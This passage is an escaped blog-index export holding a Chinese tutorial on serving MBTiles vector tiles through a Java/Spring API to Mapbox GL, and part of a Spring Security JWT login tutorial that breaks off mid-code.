参见文档，Mbtiles其实本质是一个SQLite3文件，大家知道，SQLite有它天然的可移植特性（整个数据库就是一个sqlite3文件，当然可移植性够好）。这个解决了1的问题。\n下面简单解读一下规范，该规范描述了这个sqlite3文件的表必须符合以下规定：\n必须要一个名叫“metadata”的table（表）或者view（视图），这个表其实就是“元数据”表，用来描述存储的数据。这个表必须要有两列，一列是\u0026quot;name\u0026quot;，一列是“value”，这两列都是text类型的。这个表必须包含一些特定的row,例如name=\u0026ldquo;name\u0026rdquo;,value=\u0026ldquo;数据集名称\u0026rdquo;；name: \u0026ldquo;format\u0026rdquo; ,value: \u0026ldquo;pbf\u0026quot;代表存储的瓦片格式；name: \u0026ldquo;center\u0026rdquo; ,value: -122.1906,37.7599,1代表这个数据集存储的数据中心在这个经纬度处。对于Mapbox矢量瓦片集，有特殊的json字段，用来描述矢量瓦片集。\n必须要有一个名字叫“tiles”的表。建表语句\nCREATE TABLE tiles (zoom_level integer, tile_column integer, tile_row integer, tile_data blob);\n它可能会有一个索引：\nCREATE UNIQUE INDEX tile_index on tiles (zoom_level, tile_column, tile_row);\n这个表主要存了x/y/z和对应的瓦片数据（BLOB)\n2.金字塔模型 要了解mbtiles是怎么存储的，首先需要先了解瓦片地图的金字塔模型\n众所周知，对于Web而言，将矢量图层渲染为栅格数据是一个昂贵的计算过程。对于不经常修改的矢量图层，重复描绘同样线条会极大浪费CPU资源。继Google Maps推出瓦片地图后，各大地图网站都转而采取预先渲染标注好的海量图片并分割为256*256像素瓦片的策略，从而使得浏览器能快速地缓存小尺寸且不会更名的瓦片。\n瓦片地图是一个三维的概念，即金字塔模型，其每增大一级，会在上一级瓦片的基础上一分为四，随着分辨率的提升，显示的内容也渐显丰富。通常使用xyz三维坐标系来对一张瓦片进行精准定位，其中z用于表示地图的层级，xy表示某个层级内的瓦片平面。该瓦片平面可被视为数学上常见的笛卡尔坐标系，只要确定了横轴坐标x和纵轴坐标y，便可以唯一确定在这个瓦片平面上的每一个瓦片，如图所示。\n3.mbtiles结构 示例数据2017-07-03_planet_z0_z14.mbtiles，下载地址：https://data.maptiler.com/downloads/tileset/osm/\nmbtiles中几个比较重要的表：\nmap：存储层级以及行列号**（金字塔模型**），以及瓦片id images：存储瓦片id以及对应的图片数据 metadata：存取地图的元数据信息 3.1 metadata表 3.2 tiles视图 视图构建SQL：\n1 2 3 4 5 6 7 SELECT map.zoom_level AS zoom_level, map.tile_column AS tile_column, map.tile_row AS tile_row, images.tile_data AS tile_data FROM map JOIN images ON images.tile_id = map.tile_id 通过sql语句我们可以知道tiles视图其实就是把map表里面的瓦片层级信息与images表的瓦片图片数据关联起来\n视图基本结构：\n4.Java加载Mbtiles发布地图服务 示例数据2017-07-03_planet_z0_z14.mbtiles，下载地址：https://data.maptiler.com/downloads/tileset/osm/\n4.1 加载mbtiles 加载sqlite驱动\n1 2 3 4 5 6 \u0026lt;!-- sqlite驱动 --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.xerial\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;sqlite-jdbc\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.34.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 连接数据库\n1 2 3 4 5 6 7 8 9 10 11 try { Class.forName(\u0026#34;org.sqlite.JDBC\u0026#34;); } catch (ClassNotFoundException e) { // e.printStackTrace(); log.warn(\u0026#34;Database driver not found!\u0026#34;); } // 得到连接 会在你所填写的文件夹建一个你命名的文件数据库 Connection conn; // String conurl = \u0026#34;jdbc:sqlite:E:/mapArchiveFiles/tianditu/img_c.mbtiles\u0026#34;; conn = DriverManager.getConnection(conurl,null,null); 封装为bean\n地图服务的接口每次都需请求上百张图片，如果每次请求都重新连接数据库会导致程序崩溃，所以需将其封装为bean，暴露出连接mbtiles的Connection，这样只需项目启动时连接一次数据库即可\n注意：连接数据库 返回连接数据库的Connection 不能返回执行SQL语句的statement，因为每个Statement对象只能同时打开一个ResultSet对象，高并发情况下会出现 rs.isOpen() on exec 的错误\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 @Slf4j @Configuration public class SqliteConfig { @Bean(name = \u0026#34;mbtilesConnection\u0026#34;) Connection mbtilesConnection() throws SQLException { String path = \u0026#34;Z:/2017-07-03_planet_z0_z14.mbtiles\u0026#34;; // mbtiles路径 return getConnection(\u0026#34;jdbc:sqlite:\u0026#34; + path); } public static Connection getConnection(String conurl) throws SQLException { try { Class.forName(\u0026#34;org.sqlite.JDBC\u0026#34;); } catch (ClassNotFoundException e) { // e.printStackTrace(); log.warn(\u0026#34;Database driver not found!\u0026#34;); } // 得到连接 会在你所填写的文件夹建一个你命名的文件数据库 Connection conn; // String conurl = \u0026#34;jdbc:sqlite:E:/mapArchiveFiles/tianditu/img_c.mbtiles\u0026#34;; conn = DriverManager.getConnection(conurl,null,null); // 设置自己主动提交为false conn.setAutoCommit(false); //推断表是否存在 ResultSet rsTables = conn.getMetaData().getTables(null, null, \u0026#34;tiles\u0026#34;, null); if(!rsTables.next()){ log.warn(\u0026#34;{} does not exist!\u0026#34;, conurl); } else { log.info(\u0026#34;{} successfully connected!\u0026#34;, conurl); } return conn; // return conn.createStatement(); } } 4.2 查询mbtiles 根据请求的层级z以及行列号x、y到数据库的tiles表查找对应的瓦片数据\n**注意：**由于mapbox只能加载未压缩的pbf格式数据，直使用tippecanoe生成的pbf是经过gzip压缩的数据，不执行解压缩，mapbox加载数据会报：“Unimplemented type: 3” 错误，所以必须对得到的tile_data解压缩：FileUtils.gzipUncompress(imgByte)\n是否需要解压缩要根据生成mbtiles时对瓦片采取的操作而定，例如使用mbutil工具实现地图切片向mbtiles文件格式的转换，其生成mbtiles时图片并没有经过压缩，所以在获取到tile_data时就不需要解压缩，如下是mbutil生成mbtiles时的部分代码片段，可以看到mbutil只是对图片二进制处理，并没有压缩\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 private void queryMbtilesWithUncompress( TilesDTO tilesDTO, Connection connection, HttpServletResponse response){ try { Statement statement = connection.createStatement(); // 得到结果集 String sql = \u0026#34;SELECT * FROM tiles WHERE zoom_level = \u0026#34;+ tilesDTO.getZoom_level() + \u0026#34; AND tile_column = \u0026#34;+ tilesDTO.getTile_column() + \u0026#34; AND tile_row = \u0026#34;+ tilesDTO.getTile_row() ; ResultSet rs = statement.executeQuery(sql); if(rs.next()) { byte[] imgByte = (byte[]) rs.getObject(\u0026#34;tile_data\u0026#34;); // 解压缩 byte[] bytes = FileUtils.gzipUncompress(imgByte); InputStream is = new ByteArrayInputStream(bytes); OutputStream os = response.getOutputStream(); try { int count = 0; byte[] buffer = new byte[1024 * 1024]; while ((count = is.read(buffer)) != -1) { os.write(buffer, 0, count); } os.flush(); } catch (IOException e) { // e.printStackTrace(); } finally { os.close(); is.close(); } } else{ log.debug(\u0026#34;sql: {}\u0026#34;,sql); log.debug(\u0026#34;未找到瓦片!\u0026#34;); } rs.close(); //statement在每次执行之后都要关了 statement.close(); }catch (Exception e){ // e.printStackTrace(); } } GZIP解压\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 //GZIP解压 public static byte[] gzipUncompress(byte[] bytes) { if (bytes == null || bytes.length == 0) { return null; } ByteArrayOutputStream out = new ByteArrayOutputStream(); ByteArrayInputStream in = new ByteArrayInputStream(bytes); try { GZIPInputStream ungzip = new GZIPInputStream(in); byte[] buffer = new byte[256]; int n; while ((n = ungzip.read(buffer)) \u0026gt;= 0) { out.write(buffer, 0, n); } } catch (IOException e) { log.error(\u0026#34;gzip uncompress error.\u0026#34;, e); } return out.toByteArray(); } 4.3 接口编写 controller层\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 @ApiOperation(value = \u0026#34;得到mapbox瓦片\u0026#34; ) @GetMapping(\u0026#34;/mapbox/{z}/{x}/{y}.pbf\u0026#34;) public void getMapboxTiles( @ApiParam(name = \u0026#34;z\u0026#34;, value = \u0026#34;zoom_level\u0026#34;) @PathVariable int z, @ApiParam(name = \u0026#34;x\u0026#34;, value = \u0026#34;tile_column\u0026#34;) @PathVariable int x, @ApiParam(name = \u0026#34;y\u0026#34;, value = \u0026#34;tile_row\u0026#34;) @PathVariable int y , HttpServletResponse response){ TilesDTO tilesDTO = new TilesDTO(); tilesDTO.setTile_column(x); tilesDTO.setTile_row((int)(Math.pow(2,z)-1-y)); tilesDTO.setZoom_level(z); tilesService.getMapboxTiles(tilesDTO, response); } 5.mapbox加载地图服务 5.1 html 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Add a vector tile source\u0026lt;/title\u0026gt; \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;initial-scale=1,maximum-scale=1,user-scalable=no\u0026#34;\u0026gt; \u0026lt;link href=\u0026#34;https://api.mapbox.com/mapbox-gl-js/v2.8.2/mapbox-gl.css\u0026#34; rel=\u0026#34;stylesheet\u0026#34;\u0026gt; \u0026lt;script src=\u0026#34;https://api.mapbox.com/mapbox-gl-js/v2.8.2/mapbox-gl.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;style\u0026gt; body { margin: 0; padding: 0; } #map { position: absolute; top: 0; bottom: 0; width: 100%; } \u0026lt;/style\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div id=\u0026#34;map\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;script\u0026gt; mapboxgl.accessToken = \u0026#39;pk.eyJ...e2_rdU2nOUvtwltBIZtZg\u0026#39;; const map = new mapboxgl.Map({ container: \u0026#39;map\u0026#39;, style: \u0026#39;mapbox://styles/mapbox/light-v10\u0026#39;, zoom: 5, center: [118.447303, 30.753574] }); map.on(\u0026#34;load\u0026#34;, () =\u0026gt; { map.addSource(\u0026#34;testMapLine\u0026#34;, { type: \u0026#34;vector\u0026#34;, tiles: [\u0026#34;http://localhost:9000/tiles/mapbox/{z}/{x}/{y}.pbf }); map.addLayer({ id: \u0026#34;testMapLineLayer\u0026#34;, type: \u0026#34;fill\u0026#34;, source: \u0026#34;testMapLine\u0026#34;, // ST_AsMVT() uses \u0026#39;default\u0026#39; as layer name \u0026#34;source-layer\u0026#34;: \u0026#34;water\u0026#34;, \u0026#34;filter\u0026#34;: [\u0026#34;all\u0026#34;, [\u0026#34;!=\u0026#34;, \u0026#34;brunnel\u0026#34;, \u0026#34;tunnel\u0026#34;]], minzoom: 0, maxzoom: 22, \u0026#34;paint\u0026#34;: { \u0026#34;fill-color\u0026#34;: \u0026#34;rgb(158,189,255)\u0026#34;, \u0026#34;fill-opacity\u0026#34;: [\u0026#34;literal\u0026#34;, 1] } }); }) \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 5.2 效果展示 可以看到水体被加载出来了\n6.发布osm-liberty形式的地图服务 mapbox还有一种直接请求osm-liberty.json的方式加载地图服务\n6.1 地图服务接口 接口层\n1 2 3 4 5 @ApiOperation(value = \u0026#34;得到mapbox元数据json\u0026#34; ) @GetMapping(\u0026#34;/mapbox/liberty.json\u0026#34;) public JSONObject getMapboxLibertyJson(){ return tilesService.getMapboxLibertyJson(); } Service层\n首先加载原始的osm_liberty.json，将自定义tiles.json接口地址更新至osm_liberty.json中\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 public JSONObject getMapboxLibertyJson() { try { File file = ResourceUtils.getFile(resourcePath + \u0026#34;/osm_liberty.json\u0026#34;); Map map = FileUtils.readJson(file); JSONObject jsonObject = new JSONObject(map); String sourceUrl = \u0026#34;http://localhost:9000/tiles/mapbox/metadata/tiles.json\u0026#34;; ((Map)((Map) jsonObject.get(\u0026#34;sources\u0026#34;)).get(\u0026#34;openmaptiles\u0026#34;)).put(\u0026#34;url\u0026#34;, sourceUrl); return jsonObject; }catch (Exception e){ e.printStackTrace(); } return null; } tiles.json接口\n1 2 3 4 5 6 7 8 // \u0026#34;https://api.maptiler.com/tiles/v3/tiles.json?key=XAapkmkXQpx839NCfnxD\u0026#34; @ApiOperation(value = \u0026#34;得到mapbox元数据json\u0026#34; ) @GetMapping(\u0026#34;/mapbox/metadata/tiles.json\u0026#34;) public JSONObject getMapboxTilesMetadataJson(){ return tilesService.getMapboxTilesMetadataJson(); } getMapboxTilesMetadataJson方法中，可以看到我们用到了mbtiles中metadata表里面的数据，同时，tiles.json的tiles就是我们[4.3](# 4.3 接口编写)编写的接口\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 public JSONObject getMapboxTilesMetadataJson() { JSONObject result = new JSONObject(); try { Statement statement = mapboxConnection.createStatement(); // 得到结果集 String sql = \u0026#34;SELECT * FROM metadata\u0026#34;; ResultSet rs = statement.executeQuery(sql); while (rs.next()) { String name = (String) rs.getObject(\u0026#34;name\u0026#34;); String value = (String) rs.getObject(\u0026#34;value\u0026#34;); JSONObject jsonObject = formatMetadata(name, value); result.put(jsonObject.getString(\u0026#34;name\u0026#34;),jsonObject.get(\u0026#34;value\u0026#34;)); } rs.close(); //statement在每次执行之后都要关了 statement.close(); }catch (Exception e){ e.printStackTrace(); } result.put(\u0026#34;tiles\u0026#34;, Arrays.asList(\u0026#34;http://localhost:9000/tiles/mapbox/{z}/{x}/{y}.pbf\u0026#34;)); // result.put(\u0026#34;tiles\u0026#34;, Arrays.asList(\u0026#34;https://api.maptiler.com/tiles/v3/{z}/{x}/{y}.pbf?key=XAapkmkXQpx839NCfnxD\u0026#34;)); return result; } 6.2 mapbox加载osm-liberty.json 6.2.1 html 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Add a vector tile source\u0026lt;/title\u0026gt; \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;initial-scale=1,maximum-scale=1,user-scalable=no\u0026#34;\u0026gt; \u0026lt;link href=\u0026#34;https://api.mapbox.com/mapbox-gl-js/v2.8.2/mapbox-gl.css\u0026#34; rel=\u0026#34;stylesheet\u0026#34;\u0026gt; \u0026lt;script src=\u0026#34;https://api.mapbox.com/mapbox-gl-js/v2.8.2/mapbox-gl.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;style\u0026gt; body { margin: 0; padding: 0; } #map { position: absolute; top: 0; bottom: 0; width: 100%; } \u0026lt;/style\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div id=\u0026#34;map\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;script\u0026gt; mapboxgl.accessToken = \u0026#39;pk.eyJ1Ijoid3lqcSIsImEiOiJjbDBnZDdwajUxMXRzM2htdWxubDh1MzJrIn0.2e2_rdU2nOUvtwltBIZtZg\u0026#39;; const map = new mapboxgl.Map({ container: \u0026#39;map\u0026#39;, style: \u0026#34;http://localhost:9000/tiles/mapbox/liberty.json\u0026#34;, zoom: 5, center: [118.447303, 30.753574] }); \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 6.2.2 效果展示 可以看到所有数据（边界轮廓等）都加载出来了\n","permalink":"https://chance7bin.github.io/posts/map/%E4%BD%BF%E7%94%A8mbtiles%E5%8F%91%E5%B8%83%E5%9C%B0%E5%9B%BE%E6%9C%8D%E5%8A%A1/","summary":"1.mbtiles简介 mapbox Docs : MBTiles MbTiles 是一种用于在 sqllite 数据库中存储任意瓦片地图数据用于即时使用和高效传输的规范。 MBTiles瓦片存储规范的制定主要","title":"使用mbtiles发布地图服务"},{"content":"0 引言 该篇文章是对Spring Security学习的总结，以及系统中认证授权的代码实现\n参考链接\nSpringSecurity-从入门到精通\n1 Spring Security Spring Security 是 Spring 家族中的一个安全管理框架。相比与另外一个安全框架Shiro，它提供了更丰富的功能，社区资源也比Shiro丰富。\n一般来说中大型的项目都是使用SpringSecurity 来做安全框架。小项目有Shiro的比较多，因为相比与SpringSecurity，Shiro的上手更加的简单。\n一般Web应用的需要进行认证和授权。\n认证：验证当前访问系统的是不是本系统的用户，并且要确认具体是哪个用户\n授权：经过认证后判断当前用户是否有权限进行某个操作\n而认证和授权也是SpringSecurity作为安全框架的核心功能。\n1.1 Spring Security原理初探 认证基本流程：\n根据username, password封装一个Authentication对象authenticationToken，并加入到SecurityContextHolder的context中 调用AuthenticationManager接口的authenticate(authenticationToken)方法进行认证 在第2步调用authenticate方法时，它实际会执行实现了UserDetailsService接口的loadUserByUsername方法，认证用户的逻辑就写在该方法中 在loadUserByUsername方法中，从AuthenticationContextHolder获取第一步传入的username, password，与数据库的密码做对比，验证用户密码是否正确，若正确，则把用户信息封装到实现了UserDetails接口的类中 步骤1扩展\n认证过滤器UsernamePasswordAuthenticationFilter：它的作用是拦截登录请求并获取账号和密码，然后把账号密码封装到认证凭据 UsernamePasswordAuthenticationToken 中，然后把凭据交 给特定配置的 AuthenticationManager去作认证。\n步骤2扩展\nAuthenticationManager 的实现 ProviderManager 管理了众多的 AuthenticationProvider 。每 一个 AuthenticationProvider都只支持特定类型的 Authentication ，然后是对适配到的 Authentication 进行认证，只要有一个 AuthenticationProvider认证成功，那么就认为认证成功，所有的都没有通过才认为是认证失败。认证成功后的 Authentication 就变成授信凭据，并触发认证成功的事件。认证失败的就抛出异常触发认证失败的事件。\n1.2 Spring Secutity核心内容 1.2.1 Spring Secutity中的用户信息 1.UserDetailsService：\n该方法很容易理解： 通过用户名来加载用户 。这个方法主要用于从系统数据中查询并加载具体的用户到 Spring Security中。\n在开发中我们一般定义一个这个接口的实现类，自定义loadUserByUsername方法，实现从数据源获取用户，加载用户信息。也可以在其中实现一些校验用户逻辑。\n2.UserDetails:\n从上面 UserDetailsService 可以知道最终交给Spring Security的是UserDetails 。该接口是提供用户信息的核心接口。该接口实现仅仅存储用户的信息。后续会将该接口提供的用户信息封装到认证对象Authentication 中去。\nUserDetails中默认提供：\n用户的权限集， 默认需要添加 ROLE_ 前缀 用户的加密后的密码， 不加密会使用 {noop} 前缀 应用内唯一的用户名 账户是否过期 账户是否锁定 凭证是否过期 用户是否可用 在我们自己的项目中，我们要定义个用户类实现该接口，在该用户类中我们可以扩展更多的用户信息，比如手机、邮箱等等\n1.2.2 Spring Security的配置 自定义SecurityConfig\n首先要继承WebSecurityConfigurerAdapter，其次最常用的是实现configure(AuthenticationManagerBuilder auth)、configure(WebSecurity web)、configure(HttpSecurity http)三个方法实现我们对Spring Security的自定义安全配置。\nvoid configure(AuthenticationManagerBuilder auth) 用来配置认证管理器 AuthenticationManager。 void configure(WebSecurity web)用来配置 WebSecurity 。而 WebSecurity是基于Servlet Filter用来配置 springSecurityFilterChain。而 springSecurityFilterChain 又被委托给了 Spring Security 核心过滤器 Bean DelegatingFilterProxy 。 相关逻辑可以在 WebSecurityConfiguration 中找到。我们一般不会过多来自定义 WebSecurity , 使用较多的使其 ignoring() 方法用来忽略 Spring Security 对静态资源的控制。 void configure(HttpSecurity http) 这个是我们使用最多的，用来配置 HttpSecurity 。 HttpSecurity用于构建一个安全过滤器链 SecurityFilterChain。 SecurityFilterChain 最终被注入核心过滤器 。HttpSecurity有许多我们需要的配置。我们可以通过它来进行自定义安全访问策略。 1.2.3 认证过程 详见 [1.1 Spring Security原理初探](# 1.1 Spring Security原理初探)\n1.2.4 过滤器和过滤链 SpringSecurity的原理其实就是一个过滤器链，内部包含了提供各种功能的过滤器。\nSpring Security 以一个单 Filter(FilterChainProxy)存在于整个过滤器链中，而 这个 FilterChainProxy 实际内部代理着众多的 Spring Security Filter 。\n图中只展示了核心过滤器，其它的非核心过滤器并没有在图中展示。\nUsernamePasswordAuthenticationFilter:负责处理我们在登陆页面填写了用户名密码后的登陆请求。入门案例的认证工作主要有它负责。\nExceptionTranslationFilter： 处理过滤器链中抛出的任何AccessDeniedException和AuthenticationException 。\nFilterSecurityInterceptor： 负责权限校验的过滤器。\n我们可以通过Debug查看当前系统中SpringSecurity过滤器链中有哪些过滤器及它们的顺序。\n向项目中添加过滤器：\n在配置文件的configure(HttpSecurity httpSecurity)方法中：\n4个方法分别是：addFilter–添加过滤器；addFilterAfter–把过滤器添加到某过滤器之后；addFilterAt–替代某过滤器；addFilterBefore–把过滤器添加到某过滤器之前\n1.2.5 权限相关 一、基于配置表达式控制 URL 路径\n在继承WebSecurityConfigurerAdapter的配置类中的configure(HttpSecurity http)中进行配置。\n1 2 3 4 5 6 7 8 protected void configure(HttpSecurity http) throws Exception { http.authorizeRequests() .antMatchers(\u0026#34;/admin/**\u0026#34;).hasRole(\u0026#34;admin\u0026#34;) .antMatchers(\u0026#34;/user/**\u0026#34;).hasAnyRole(\u0026#34;admin\u0026#34;, \u0026#34;user\u0026#34;) .anyRequest().authenticated() .and() ... } 二、基于注解的接口权限控制\n我们可以在任何 @Configuration实例上使用 @EnableGlobalMethodSecurity注解来启用全局方 法安全注解功能\n1 2 3 4 5 6 @Configuration @EnableGlobalMethodSecurity(prePostEnabled = true,securedEnabled = true,jsr250Enabled = true) public class SecurityConfig extends WebSecurityConfigurerAdapter { ... ... } 设置 prePostEnabled为 true ，则开启了基于表达式 的方法安全控制。 2 认证 2.1 登录校验流程 2.2 登录功能核心代码 在SpringBoot项目中使用SpringSecurity我们只需要引入依赖即可。\n1 2 3 4 5 \u0026lt;!-- spring security 安全认证 --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter-security\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; 1.根据username, password封装一个Authentication对象authenticationToken，调用AuthenticationManager接口的authenticate(authenticationToken)方法进行认证\nAuthentication类中：principal属性对应用户名；credentials属性对应密码\n若是需要根据邮箱登录的话把email放到principal，\nloadUserByUsername方法的参数就是这个email\n在接口中我们通过AuthenticationManager的authenticate方法来进行用户认证，所以需要在SecurityConfig中配置把AuthenticationManager注入容器。\n1 2 3 4 5 6 7 8 9 10 public String login(String username, String password, String code, String uuid) { // 用户验证 UsernamePasswordAuthenticationToken authenticationToken = new UsernamePasswordAuthenticationToken(username, password); AuthenticationContextHolder.setContext(authenticationToken); // 该方法会去调用UserDetailsServiceImpl.loadUserByUsername Authentication authentication = authenticationManager.authenticate(authenticationToken); // 生成token return tokenService.createToken(loginUser); } 密码加密存储\n实际项目中我们不会把密码明文存储在数据库中。\n一般使用SpringSecurity为我们提供的BCryptPasswordEncoder。\n我们只需要使用把BCryptPasswordEncoder对象注入Spring容器中，SpringSecurity就会使用该PasswordEncoder来进行密码校验\n部分SecurityConfig配置（[完整配置](# 2.4 配置SecurityConfig)）\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 @Configuration public class SecurityConfig extends WebSecurityConfigurerAdapter { @Override protected void configure(HttpSecurity http) throws Exception { http //关闭csrf .csrf().disable() //不通过Session获取SecurityContext .sessionManagement().sessionCreationPolicy(SessionCreationPolicy.STATELESS) .and() .authorizeRequests() // 对于登录接口 允许匿名访问 .antMatchers(\u0026#34;/user/login\u0026#34;).anonymous() // 除上面外的所有请求全部需要鉴权认证 .anyRequest().authenticated(); } @Bean @Override public AuthenticationManager authenticationManagerBean() throws Exception { return super.authenticationManagerBean(); } /** * 强散列哈希加密实现 */ @Bean public BCryptPasswordEncoder bCryptPasswordEncoder() { return new BCryptPasswordEncoder(); } /** * 身份认证接口 */ @Override protected void configure(AuthenticationManagerBuilder auth) throws Exception { // 数据库验证 // Spring Security 提供了BCryptPasswordEncoder类, // 实现Spring的PasswordEncoder接口使用BCrypt强哈希方法来加密密码 auth.userDetailsService(userDetailsService).passwordEncoder(bCryptPasswordEncoder()); } } 2.创建一个service，实现UserDetailsService接口，并重写loadUserByUsername方法\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 @Service public class UserDetailsServiceImpl implements UserDetailsService{ @Override public UserDetails loadUserByUsername(String username) throws UsernameNotFoundException { SysUser user = userService.selectUserByUserName(username); validate(user); return createLoginUser(user); } public UserDetails createLoginUser(SysUser user) { return new LoginUser(user.getUserId(), user); } } 3.实现密码验证逻辑\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 public void validate(SysUser user){ Authentication usernamePasswordAuthenticationToken = AuthenticationContextHolder.getContext(); String username = usernamePasswordAuthenticationToken.getName(); String password = usernamePasswordAuthenticationToken.getCredentials().toString(); if (!matches(user, password)) { throw new ServiceException(\u0026#34;密码错误\u0026#34;); } } public boolean matches(SysUser user, String rawPassword){ return matchesPassword(rawPassword, user.getPassword()); } /** * 判断密码是否相同 * * @param rawPassword 真实密码 * @param encodedPassword 加密后字符 * @return 结果 */ public boolean matchesPassword(String rawPassword, String encodedPassword) { BCryptPasswordEncoder passwordEncoder = new BCryptPasswordEncoder(); return passwordEncoder.matches(rawPassword, encodedPassword); } 4.验证成功后，创建令牌，存入redis中，并将token返回给前端（实现步骤1中的createToken方法）\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 /** * 创建令牌 * * @param loginUser 用户信息 * @return 令牌 */ public String createToken(LoginUser loginUser) { String token = UUID.fastUUID().toString(); loginUser.setToken(token); refreshToken(loginUser); Map\u0026lt;String, Object\u0026gt; claims = new HashMap\u0026lt;\u0026gt;(); claims.put(Constants.LOGIN_USER_KEY, token); return createToken(claims); } /** * 刷新令牌有效期 * * @param loginUser 登录信息 */ public void refreshToken(LoginUser loginUser) { loginUser.setLoginTime(System.currentTimeMillis()); loginUser.setExpireTime(loginUser.getLoginTime() + expireTime * MILLIS_MINUTE); // 根据uuid将loginUser缓存 String userKey = getTokenKey(loginUser.getToken()); // \u0026#34;login_tokens:\u0026#34; + uuid; redisCache.set(userKey, loginUser, expireTime, TimeUnit.MINUTES); } /** * 从数据声明生成令牌 * * @param claims 数据声明 * @return 令牌 */ private String createToken(Map\u0026lt;String, Object\u0026gt; claims) { String token = Jwts.builder() .setClaims(claims) .signWith(SignatureAlgorithm.HS512, secret).compact(); return token; } 2.3 校验功能核心代码 访问系统资源时，如果每次都需要去数据库验证密码是十分消耗资源的，[2.2](# 2.2 登录功能核心代码)中，最后返回了一个token，可基于该token实现保存登录状态的功能\n1.前端将后端返回的token存入Cookie中\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 login(userInfo) { const username = userInfo.username.trim(); const password = userInfo.password; return new Promise\u0026lt;void\u0026gt;((resolve, reject) =\u0026gt; { login(username, password) .then((res: any) =\u0026gt; { setToken(res.token); this.token = res.token; resolve(); }) .catch((error) =\u0026gt; { reject(error); }); }); } 1 2 3 4 5 6 import Cookies from \u0026#34;js-cookie\u0026#34;; const TokenKey = \u0026#34;Admin-Token\u0026#34;; export function setToken(token: string) { return Cookies.set(TokenKey, token); } 2.请求接口时都附上token，验证用户是否登录\nrequest.ts\n1 2 3 4 5 6 7 8 9 // request拦截器 service.interceptors.request.use( (config: any) =\u0026gt; { // 是否需要设置 token const isToken = (config.headers || {}).isToken === false; if (getToken() \u0026amp;\u0026amp; !isToken) { // 让每个请求携带自定义token 请根据实际情况自行修改 config.headers[\u0026#34;Authorization\u0026#34;] = \u0026#34;Bearer \u0026#34; + getToken(); } 3.定义Jwt认证过滤器 JwtAuthenticationTokenFilter，验证token有效性\n因为redis设置了登陆令牌的过期时间，所以如果令牌过期了，redis中就不存在token解析后的redisKey，会直接返回null，这种其概况就要重新登录了。\n添加依赖\n1 2 3 4 5 6 \u0026lt;!-- Token生成与解析--\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;io.jsonwebtoken\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;jjwt\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;${jwt.version}\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; JwtAuthenticationTokenFilter\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 /** * token过滤器 验证token有效性 * * @author 7bin */ @Component public class JwtAuthenticationTokenFilter extends OncePerRequestFilter { @Autowired private TokenService tokenService; @Override protected void doFilterInternal(HttpServletRequest request, HttpServletResponse response, FilterChain chain) throws ServletException, IOException { LoginUser loginUser = tokenService.getLoginUser(request); if (StringUtils.isNotNull(loginUser) \u0026amp;\u0026amp; StringUtils.isNull(SecurityUtils.getAuthentication())) { // 验证令牌有效期，相差不足20分钟，自动刷新缓存 tokenService.verifyToken(loginUser); // 获取权限信息封装到Authentication中 UsernamePasswordAuthenticationToken authenticationToken = new 